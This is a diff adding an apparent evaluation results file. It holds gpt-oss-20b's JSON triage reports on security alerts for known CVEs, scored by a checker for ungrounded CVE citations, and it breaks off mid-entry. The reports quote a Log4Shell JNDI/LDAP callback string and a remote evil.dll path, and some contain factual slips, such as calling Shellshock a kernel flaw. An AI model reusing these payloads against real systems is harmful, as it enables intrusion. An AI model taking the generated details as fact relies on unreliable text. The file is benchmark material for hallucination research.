@@ -1,0 +1,594 @@
+{
+  "task": "Deterministic checker run at SelfCheckGPT's sampling temperature, for a paired McNemar test",
+  "model": "openai/gpt-oss-20b",
+  "sampling_temperature": 0.7,
+  "n_total": 60,
+  "n_completed": 60,
+  "run_complete": true,
+  "results": [
+    {
+      "alert_id": "CVEPOOL-003",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2021-44228",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-003\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"The alert indicates an outbound JNDI/LDAP callback matching the Log4Shell (CVE-2021-44228) exploit signature was detected in application server logs. This suggests an attempt to trigger remote code execution via Log4j on the target host.\",\"threat_type\":\"Remote Code Execution via Log4j (Log4Shell)\",\"recommended_action\":\"Immediately isolate the affected host (10.0.7.41), apply the latest Log4j security patches or mitigate via configuration changes, block outbound LDAP traffic from the host, conduct a full forensic review of logs for additional exploitation attempts, and verify that no malicious code was executed.\",\"confidence_score\":0.95,\"reasoning\":\"The payload snippet ${jndi:ldap://10.0.7.40/a} directly matches the known Log4Shell trigger. The source IP is external, the event was flagged by a vulnerability scanner, and the severity is listed as CRITICAL, all indicating a high likelihood of an active exploitation attempt.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-004",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2021-44228",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-004\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"The alert indicates an outbound JNDI/LDAP callback that matches the Log4Shell (CVE-2021-44228) exploitation pattern, suggesting that an attacker is attempting to trigger remote code execution via the application server logs. The payload was sent over HTTPS to the internal server, indicating a potential lateral movement or reconnaissance attempt. Immediate containment is required to prevent successful exploitation.\",\"threat_type\":\"Log4Shell exploitation\",\"recommended_action\":\"Immediately block the source IP (203.0.113.204) at the perimeter firewall, isolate the affected internal server, run a full vulnerability scan and apply the latest Log4j patches or configuration mitigations. Conduct a forensic analysis of the logs to identify any successful callbacks and ensure no malicious code was executed.\",\"confidence_score\":0.95,\"reasoning\":\"The payload snippet contains the classic Log4Shell JNDI expression, and the event type is explicitly LOG4SHELL. The source IP is external, and the destination is internal, indicating an attempted exploit. Given the critical nature of CVE-2021-44228 and the outbound callback, the threat is assessed as critical.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-007",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2017-5638",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-007\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"A request targeting the public\u2011facing application attempted to exploit CVE-2017-5638, an OGNL injection vulnerability in Apache Struts2. The WAF successfully blocked the payload, but the attempt indicates an active exploitation effort. This could allow remote code execution if the server were vulnerable.\",\"threat_type\":\"Remote Code Execution via Apache Struts2 OGNL\",\"recommended_action\":\"Immediately patch the Struts2 framework to the latest version, block the source IP (203.0.113.207) at the perimeter, review application logs for additional attempts, and conduct a post\u2011mortem to ensure no persistence mechanisms were introduced.\",\"confidence_score\":0.95,\"reasoning\":\"The alert explicitly references CVE-2017-5638 and the WAF log shows an OGNL expression attempt, confirming a known RCE vector. The severity level and blocked status support a high confidence assessment.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-008",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2017-5638",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-008\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"A WAF blocked an attempted exploitation of the CVE-2017-5638 Apache Struts2 Jakarta Multipart OGNL remote code execution vulnerability. The attacker sent a malicious multipart/form-data payload targeting port 8080 of the public-facing app server from source IP 203.0.113.208. The request was detected and prevented by the WAF.\",\"threat_type\":\"Application Layer Remote Code Execution\",\"recommended_action\":\"Verify that the application is patched against CVE-2017-5638, review logs for additional similar attempts, isolate the affected server if necessary, and consider tightening WAF rules or implementing stricter input validation.\",\"confidence_score\":0.95,\"reasoning\":\"The WAF identified an OGNL expression matching the CVE-2017-5638 signature, indicating an attempted exploitation. The source IP and target port point to a public-facing application, and the vulnerability is known to allow remote code execution, justifying a critical severity assessment.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-011",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2014-0160",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\n    \"alert_id\": \"CVEPOOL-011\",\n    \"severity_assessment\": \"CRITICAL\",\n    \"threat_summary\": \"TLS inspection appliance detected an oversized heartbeat response matching CVE-2014-0160, indicating a Heartbleed memory disclosure attempt against the target server.\",\n    \"threat_type\": \"Vulnerability Exploitation \u2013 Heartbleed (CVE-2014-0160)\",\n    \"recommended_action\": \"Immediately verify that the affected server is patched for Heartbleed, isolate the host if necessary, conduct a forensic memory dump to identify any exfiltrated data, update TLS libraries, and monitor network traffic for further suspicious heartbeat requests.\",\n    \"confidence_score\": 0.95,\n    \"reasoning\": \"The alert explicitly references the Heartbleed vulnerability with a matching payload signature, and the severity is marked CRITICAL. The detection of an oversized heartbeat response is a definitive indicator of exploitation. The recommended actions align with standard mitigation procedures for this CVE.\"\n}"
+    },
+    {
+      "alert_id": "CVEPOOL-012",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2014-0160",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-012\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"A TLS inspection appliance detected an oversized heartbeat response indicating the Heartbleed vulnerability (CVE-2014-0160) was exploited. The attacker sent a heartbeat request of 65535 bytes, but the server responded with only 18 bytes, suggesting an attempted memory disclosure attack. This indicates that the source IP may have been probing for sensitive data exposed by the vulnerability.\",\"threat_type\":\"Memory Disclosure / Information Leak\",\"recommended_action\":\"Immediately block the source IP 203.0.113.212, patch all affected servers to a version that fixes CVE-2014-0160, and review TLS logs for any data exfiltration. Monitor for repeated attempts and consider enabling heartbeat request validation.\",\"confidence_score\":0.95,\"reasoning\":\"The alert explicitly references Heartbleed and the packet characteristics match a known exploit pattern. The severity label and the presence of an oversized heartbeat request provide strong evidence of an attempted memory disclosure.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-015",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2021-34473",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-015\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An attacker used the Exchange autodiscover SSRF vulnerability (CVE-2021-34473) to execute a chain that deployed a webshell on the target system. The EDR correlated the SSRF request with the dropped webshell, indicating successful exploitation of the ProxyShell vector.\",\"threat_type\":\"Remote Code Execution via Exchange SSRF (ProxyShell)\",\"recommended_action\":\"Isolate the affected host (10.0.19.161), block traffic from 203.0.113.215, apply the latest Microsoft Exchange security patches, remove any webshell files, run a full malware scan, and monitor for further suspicious activity.\",\"confidence_score\":0.92,\"reasoning\":\"The alert shows a known SSRF-based ProxyShell exploit with a webshell drop, matching CVE-2021-34473. The correlation between the SSRF request and the webshell indicates successful compromise, warranting immediate containment and remediation actions.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-016",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2021-34473",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-016\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An attacker used the ProxyShell CVE-2021-34473 SSRF vulnerability in Exchange\u2019s autodiscover service to inject a malicious payload and drop a webshell on the target system. The EDR correlation indicates the request was followed by a successful webshell deployment, enabling remote code execution.\",\"threat_type\":\"ProxyShell SSRF Exploit\",\"recommended_action\":\"Immediately block the source IP (203.0.113.216) at the firewall, isolate the affected host (10.0.5.21) for forensic analysis, confirm the presence of a webshell, apply the latest Microsoft Exchange security updates, and conduct a full integrity check of the Exchange environment.\",\"confidence_score\":0.95,\"reasoning\":\"The alert references CVE-2021-34473, a known ProxyShell SSRF exploit that allows remote code execution via Exchange autodiscover. The EDR correlation and payload snippet confirm the exploitation chain, justifying a high confidence score and critical severity.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-019",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2016-5195",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-019\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"The alert indicates an unprivileged user attempted a race\u2011condition write to /proc/self/mem, a classic Dirty COW (CVE-2016-5195) kernel exploit. This could allow the attacker to gain elevated privileges on the target host.\",\"threat_type\":\"Privilege Escalation \u2013 Kernel Exploit\",\"recommended_action\":\"Immediately isolate the affected host from the network, apply the latest kernel patch that mitigates CVE-2016-5195, verify kernel integrity, and conduct a full forensic investigation for any persistence mechanisms.\",\"confidence_score\":0.95,\"reasoning\":\"The audit log clearly shows a ptrace POKETEXT call on /proc/self/mem by an unprivileged UID, matching the known Dirty COW exploit pattern. The severity label is CRITICAL, and the exploit is well\u2011documented, providing high confidence in the assessment.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-020",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2016-5195",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-020\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"The kernel audit log detected a race\u2011condition write to /proc/self/mem by an unprivileged user, consistent with the Dirty COW (CVE-2016-5195) privilege\u2011escalation vulnerability. This indicates an attacker is attempting to gain root privileges on the host. The source IP 203.0.113.220 is the origin of the exploit attempt.\",\"threat_type\":\"Privilege Escalation\",\"recommended_action\":\"Immediately verify the kernel version on 10.0.9.61, apply the latest security patch for CVE-2016-5195, isolate the host from the network, and conduct a forensic investigation to identify any successful privilege escalations. Monitor for repeated /proc/self/mem write attempts and enforce strict kernel security hardening (e.g., noexec, securebits).\",\"confidence_score\":0.9,\"reasoning\":\"The event type and payload clearly match the Dirty COW vulnerability pattern. The severity tag is CRITICAL, and the exploit attempt originates from an external IP, indicating a high\u2011risk privilege escalation scenario.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-023",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2017-0144",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\n    \"alert_id\": \"CVEPOOL-023\",\n    \"severity_assessment\": \"CRITICAL\",\n    \"threat_summary\": \"An external attacker from 203.0.113.223 attempted to exploit the EternalBlue SMBv1 vulnerability (CVE-2017-0144) against an unpatched internal host 10.0.12.91 on TCP port 445, as identified by an IDS signature match.\",\n    \"threat_type\": \"Vulnerability Exploit\",\n    \"recommended_action\": \"Immediately patch or disable SMBv1 on the affected host, block the source IP 203.0.113.223 at the perimeter firewall, isolate the target host, run a full vulnerability scan, and monitor for signs of lateral movement or further exploitation.\",\n    \"confidence_score\": 0.95,\n    \"reasoning\": \"The alert contains a definitive IDS signature for the EternalBlue SMBv1 exploit, references the well\u2011known CVE-2017-0144, and indicates the target is unpatched. These factors combine to classify the incident as a high\u2011risk remote code execution attempt, warranting immediate remediation steps.\"\n}"
+    },
+    {
+      "alert_id": "CVEPOOL-024",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2017-0144",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-024\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An external host attempted to exploit the SMBv1 vulnerability CVE-2017-0144 (EternalBlue) against an unpatched internal machine. The IDS detected a buffer overflow in the SMB1 TRANS2_QUERY_PATH_INFORMATION request.\",\"threat_type\":\"Remote Exploit via SMBv1 (CVE-2017-0144)\",\"recommended_action\":\"Immediately block the source IP 203.0.113.224 on the perimeter firewall, disable SMBv1 on the target host, and apply the latest Windows patches. Conduct a forensic review of the target to confirm no compromise and monitor for related activity.\",\"confidence_score\":0.95,\"reasoning\":\"The IDS signature and payload snippet explicitly match the known EternalBlue exploit pattern, indicating a high likelihood of a genuine attack attempt.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-027",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2014-6271",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-027\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"A malicious CGI request attempted to exploit the Shellshock vulnerability (CVE-2014-6271) by injecting a Bash command in the User-Agent header. The WAF successfully blocked the request, preventing execution of the payload that would have read /etc/passwd.\",\"threat_type\":\"Remote Command Execution via Shellshock\",\"recommended_action\":\"Verify that the WAF rule set is up to date and properly filtering Shellshock vectors, patch the affected Bash version on the target host, conduct a full audit of CGI scripts for hardcoded environment variable usage, and monitor logs for repeated attempts.\",\"confidence_score\":0.95,\"reasoning\":\"The payload snippet clearly matches the Shellshock exploit pattern, and the event type and description confirm that the WAF intercepted it. The severity is marked CRITICAL, and the evidence of a direct exploitation attempt provides high confidence in the assessment.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-028",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2014-6271",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-028\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"A WAF detected and blocked a CGI request attempting to exploit the Shellshock vulnerability (CVE\u20112014\u20116271). The payload tried to execute a Bash command to read /etc/passwd via a malicious User\u2011Agent header. This indicates an active attempt to exploit a known kernel\u2011level flaw.\",\"threat_type\":\"Vulnerability Exploitation (Shellshock)\",\"recommended_action\":\"Verify that the WAF rule set remains up\u2011to\u2011date and confirm no similar requests bypassed the filter. Patch all affected Bash installations, ensure CGI scripts are not exposed, and monitor for repeated exploitation attempts.\",\"confidence_score\":0.95,\"reasoning\":\"The alert provides clear evidence of a Shellshock exploit attempt that was blocked by the WAF. The severity is appropriately marked as CRITICAL due to the high impact of the vulnerability, and the recommended actions align with standard mitigation procedures.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-031",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2021-34527",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-031\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An unprivileged session on host 10.0.5.21 attempted to load an unsigned printer driver from a remote SMB share, triggering a Print Spooler exploit (CVE-2021-34527). The EDR flagged the RpcAddPrinterDriverEx call, indicating an active attempt to execute malicious code via the PrintNightmare vulnerability.\",\"threat_type\":\"Remote Code Execution via Print Spooler Exploit\",\"recommended_action\":\"Immediately isolate the affected host from the network, apply the latest Windows security updates that patch CVE-2021-34527, disable remote printer driver installation, and conduct a forensic analysis of the SMB share to ensure no additional malicious payloads remain.\",\"confidence_score\":0.95,\"reasoning\":\"The alert includes a direct match to the known PrintNightmare exploit, with an unsigned driver being loaded from a remote share, a classic execution path for this vulnerability. The severity is correctly classified as CRITICAL based on the exploit\u2019s potential to compromise the system with elevated privileges. The recommended actions align with vendor guidance and best practices for mitigating this specific threat.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-032",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2021-34527",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-032\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An unprivileged session on an unknown host attempted to load an unsigned remote printer driver via RpcAddPrinterDriverEx, using an SMB share at \\\\10.0.6.30\\\\share\\\\evil.dll. This matches the PrintNightmare (CVE-2021-34527) exploit, which can lead to remote code execution with SYSTEM privileges.\",\"threat_type\":\"Print Spooler Exploit (CVE-2021-34527)\",\"recommended_action\":\"Immediately isolate the affected host, block SMB traffic on port 445, apply the latest Print Spooler patch, remove any malicious drivers, and run a full endpoint scan. Monitor for lateral movement and verify that no other machines are compromised.\",\"confidence_score\":0.95,\"reasoning\":\"The alert explicitly indicates a Print Spooler call to load an unsigned driver from a network share, which is the classic PrintNightmare scenario. The severity is marked CRITICAL, and the event type confirms the exploit. No additional ambiguous data is present, so the assessment is highly confident.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-035",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2022-22965",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\n    \"alert_id\": \"CVEPOOL-035\",\n    \"severity_assessment\": \"CRITICAL\",\n    \"threat_summary\": \"The application firewall detected and blocked a class-loader manipulation request that matches the signature of CVE-2022-22965 (Spring4Shell). The attacker attempted to exploit a remote code execution vulnerability on the target Spring application.\",\n    \"threat_type\": \"Remote Code Execution via Spring4Shell (CVE-2022-22965)\",\n    \"recommended_action\": \"Confirm the target application is patched for CVE-2022-22965, block the source IP 203.0.113.205, review application logs for any successful exploitation attempts, and apply the latest Spring framework security updates. Monitor for repeat attempts.\",\n    \"confidence_score\": 0.95,\n    \"reasoning\": \"The payload snippet and event type explicitly reference CVE-2022-22965, and the firewall blocked a known exploitation pattern, indicating a high likelihood of a Spring4Shell attempt.\"\n}"
+    },
+    {
+      "alert_id": "CVEPOOL-036",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2022-22965",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\n    \"alert_id\": \"CVEPOOL-036\",\n    \"severity_assessment\": \"CRITICAL\",\n    \"threat_summary\": \"An attempt was made to exploit the Spring4Shell vulnerability (CVE-2022-22965) via a class\u2011loader manipulation request on port 8080. The application firewall successfully blocked the payload, which contains characteristic parameter binding signatures for the exploit.\",\n    \"threat_type\": \"Remote Code Execution via Spring4Shell (CVE-2022-22965)\",\n    \"recommended_action\": \"Immediately block the source IP 203.0.113.206, verify the affected Spring application is patched to the latest version, audit all recent deployment changes, and monitor logs for additional exploitation attempts.\",\n    \"confidence_score\": 0.95,\n    \"reasoning\": \"The payload snippet explicitly references CVE-2022-22965 and the event type is labeled SPRING4SHELL. The firewall log confirms the request was blocked, indicating a high likelihood of an exploitation attempt. The severity field in the alert is marked CRITICAL, reinforcing the urgency.\"\n}"
+    },
+    {
+      "alert_id": "CVEPOOL-039",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2023-4966",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-039\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"A Citrix NetScaler appliance has logged an oversized Host header request that matches the signature of CVE-2023-4966 (Citrix Bleed), indicating an attempt to exploit the vulnerability to leak session tokens. The source IP 203.0.113.209 targeted port 443 on the internal server, suggesting a potential credential compromise.\",\"threat_type\":\"Information Disclosure via Vulnerability Exploitation\",\"recommended_action\":\"Immediately block the source IP, isolate the affected NetScaler, apply the latest security patch that mitigates CVE-2023-4966, and conduct a full audit of session logs for any leaked tokens. Monitor for additional exploitation attempts and verify that all internal authentication services are not compromised.\",\"confidence_score\":0.95,\"reasoning\":\"The alert explicitly references CVE-2023-4966 and includes a payload snippet matching the known oversized Host header exploit. The severity label CRITICAL and the nature of the payload strongly support a high\u2011confidence assessment that the attacker is exploiting the vulnerability to extract session tokens.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-040",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2023-4966",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-040\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"The NetScaler appliance has logged a session token leakage consistent with the CVE-2023-4966 (Citrix Bleed) vulnerability. An attacker sent an oversized Host header on a TLS connection, causing the appliance to expose authentication tokens. This indicates an active exploitation attempt targeting the appliance\u2019s authentication infrastructure.\",\"threat_type\":\"Vulnerability Exploitation\",\"recommended_action\":\"Immediately isolate the affected NetScaler appliance from the network, apply the latest Citrix patch that mitigates CVE-2023-4966, and conduct a thorough audit of session tokens and access logs. Monitor for additional suspicious traffic from the source IP and consider blocking or rate\u2011limiting that IP. Verify the integrity of all configuration files and perform a post\u2011incident forensic analysis.\",\"confidence_score\":0.95,\"reasoning\":\"The alert explicitly references the CVE-2023-4966 exploitation and a known session token leakage pattern. The severity label is CRITICAL, and the payload snippet confirms the oversized Host header attack vector. Based on these indicators, the assessment is highly confident that the incident represents an active exploitation of a critical vulnerability.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-043",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2023-34362",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-043\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"The alert indicates a successful exploitation of CVE-2023-34362 in MOVEit Transfer, where an attacker performed a SQL injection that chained to execute arbitrary commands via xp_cmdshell. A webshell was dropped, granting the attacker persistent remote access to the target system. The attack leveraged the MOVEit Transfer web interface over HTTPS.\",\"threat_type\":\"Remote Code Execution via SQL Injection\",\"recommended_action\":\"Immediately isolate the affected MOVEit Transfer instance from the network, apply the vendor patch for CVE-2023-34362, conduct a full forensic analysis to locate and remove the webshell, and verify system integrity before restoring connectivity.\",\"confidence_score\":0.95,\"reasoning\":\"The payload snippet shows a classic SQLi exploitation pattern with xp_cmdshell execution, directly matching the known vulnerability CVE-2023-34362. The presence of a webshell drop confirms successful RCE and persistence, warranting a critical severity classification and immediate containment actions.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-044",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2023-34362",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-044\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An attacker exploited CVE-2023-34362 in MOVEit Transfer to inject SQL that executed a shell command, dropping a webshell via certutil. The webshell allows remote code execution over the web interface.\",\"threat_type\":\"SQL Injection \u2192 Remote Code Execution (Webshell)\",\"recommended_action\":\"Immediately isolate the affected MOVEit Transfer server, block traffic from 203.0.113.214, patch to the latest MOVEit release, perform a full forensic scan for webshells and other malicious files, review access logs for further compromise, and update intrusion detection rules for similar payloads.\",\"confidence_score\":0.95,\"reasoning\":\"The alert clearly indicates a successful SQL injection leading to execution of xp_cmdshell, consistent with a known CVE, and the payload shows a webshell drop. The severity and context support a critical assessment and the recommended steps are standard for such incidents.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-047",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2021-26855",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-047\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An attacker from 203.0.113.217 has exploited the Exchange SSRF authentication bypass (CVE-2021-26855) to send a malicious request to the internal Exchange server on 10.0.6.31. The payload indicates the use of the X-AnonResource header to trigger a SSRF, potentially allowing the attacker to read or modify internal resources or execute arbitrary code.\",\"threat_type\":\"Exploitation of Vulnerability (Remote Code Execution via SSRF)\",\"recommended_action\":\"Immediately block the source IP 203.0.113.217, quarantine the affected host, and apply the latest Microsoft Exchange security update for CVE-2021-26855. Conduct a thorough forensic analysis to check for lateral movement or data exfiltration.\",\"confidence_score\":0.95,\"reasoning\":\"The alert explicitly references a known critical vulnerability (CVE-2021-26855) with a matching payload pattern. The source IP is external, the destination is internal, and the event type is PROXYLOGON, confirming a successful exploitation attempt. The severity label in the alert is CRITICAL, and the evidence supports a high confidence assessment.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-048",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2021-26855",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-048\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An attacker from 203.0.113.218 exploited the Exchange SSRF authentication bypass (CVE-2021-26855) to send a malicious request via port 443. The payload indicates the use of the X-AnonResource header to target an internal FQDN, potentially allowing unauthorized access to internal services.\",\"threat_type\":\"SSRF Exchange Authentication Bypass\",\"recommended_action\":\"Immediately block the source IP, patch the affected Exchange server to the latest security update, and isolate the compromised host. Conduct a thorough internal scan for lateral movement and verify that no additional SSRF vectors remain open.\",\"confidence_score\":0.95,\"reasoning\":\"The alert explicitly references CVE-2021-26855, a known critical vulnerability. The presence of the exploit-specific header and the use of port 443 align with documented attack patterns, indicating a high confidence in the threat assessment.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-051",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2019-0708",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-051\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An external host (203.0.113.221) attempted a pre\u2011authentication exploit against the internal RDP service on 10.0.10.71, targeting the CVE\u20112019\u20110708 (BlueKeep) vulnerability. The IDS signature matched a known RDP handshake anomaly, indicating a likely exploitation attempt.\",\"threat_type\":\"Remote Exploit (CVE\u20112019\u20110708)\",\"recommended_action\":\"Immediately block the source IP, apply the latest RDP security patches or disable RDP if not required, and investigate the target system for signs of compromise. Monitor RDP logs for additional attempts and consider enabling Network Level Authentication (NLA).\",\"confidence_score\":0.95,\"reasoning\":\"The alert includes a clear IDS signature for BlueKeep, the known CVE identifier, and the RDP port 3389, confirming a high\u2011severity exploit attempt. The source IP is external, the target is internal, and the event type is labeled BLUEKEEP, all indicating a critical vulnerability exploitation scenario.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-052",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2019-0708",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-052\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"An RDP pre-authentication exploit attempt consistent with BlueKeep (CVE-2019-0708) was detected from IP 203.0.113.222 targeting the internal host 10.0.11.81 on port 3389. The IDS signature matched a known vulnerability that allows remote code execution without authentication.\",\"threat_type\":\"RDP Pre-Authentication Exploit (BlueKeep)\",\"recommended_action\":\"Immediately block the source IP, apply the latest RDP security patch (KB5000802 or later), and verify that the target system is patched. Monitor the network for additional RDP traffic and investigate any further anomalous connections.\",\"confidence_score\":0.95,\"reasoning\":\"The alert contains a clear IDS signature match for CVE-2019-0708, a critical vulnerability that allows remote code execution. The event is flagged as CRITICAL, the source IP is external, and the target is an internal RDP service. Therefore, the likelihood of an actual exploit attempt is very high.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-055",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2020-1472",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"CVEPOOL-055\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"The domain controller logged a Netlogon authentication attempt using an 8\u2011byte zero challenge, indicating a Zerologon (CVE-2020-1472) exploitation. This allows an attacker to bypass authentication and impersonate any account on the network. The source IP 203.0.113.225 is attempting to exploit the vulnerability over SMB port 445.\",\"threat_type\":\"Authentication Bypass\",\"recommended_action\":\"Immediately isolate the affected domain controller, apply the latest Windows patch for CVE-2020-1472, reset passwords for all domain accounts, conduct a full vulnerability scan, and monitor for further unusual authentication activity.\",\"confidence_score\":0.95,\"reasoning\":\"The alert details match the known Zerologon exploitation pattern: an 8\u2011byte zero client challenge over TCP port 445. The severity is listed as CRITICAL, and the event type is explicitly ZEROLOGON, confirming the threat type. Standard mitigation steps are recommended.\"}"
+    },
+    {
+      "alert_id": "CVEPOOL-056",
+      "class": "stated",
+      "expected_ungrounded": false,
+      "ground_truth_cve": "CVE-2020-1472",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
